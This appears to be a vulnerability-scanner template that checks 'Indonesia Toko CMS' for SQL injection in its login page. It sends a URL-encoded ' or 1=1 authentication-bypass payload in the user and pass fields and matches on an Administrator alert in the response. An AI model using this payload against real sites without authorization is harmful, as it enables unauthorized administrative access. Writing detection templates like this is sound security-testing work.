id: indonasia-toko-cms-sql
brief:
    title: Indonasia Toko CMS - SQL Injection
    by: r3Y3r53
    level: high
    about: Indonesia Toko CMS is susceptible to SQL Injection in its login system, enabling attackers to exploit vulnerabilities and bypass authentication by injecting malicious SQL code.
    label:
        - sqli
        - toko
        - cms
        - vuln
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/index.php?mnu=login'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: user=%27+or+1%3D1+limit+1+--+-%2B&pass=%27+or+1%3D1+limit+1+--+-%2B&Login=Login
      signs:
        - "on": word
          has:
            - alert('Administrator
          in: body
          need: all
        - "on": status
          status:
            - 200
